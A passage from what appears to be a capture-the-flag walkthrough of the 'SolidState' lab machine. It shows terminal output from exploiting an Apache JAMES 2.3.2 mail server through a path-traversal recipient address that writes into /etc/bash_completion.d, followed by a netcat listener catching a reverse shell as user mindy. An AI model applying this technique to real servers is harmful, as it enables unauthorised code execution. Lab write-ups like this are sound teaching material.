-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: 0xdf@10.10.14.47>
Message-ID: <8915397.8.1588217962318.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.47 ([10.10.14.47])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
FROM: 0xdf@10.10.14.47

: No such file or directory
-rbash: $'\r': command not found
mindy@solidstate:~$ ls
bin  user.txt

```

And I have a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.51.
Ncat: Connection from 10.10.10.51:49678.
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)

```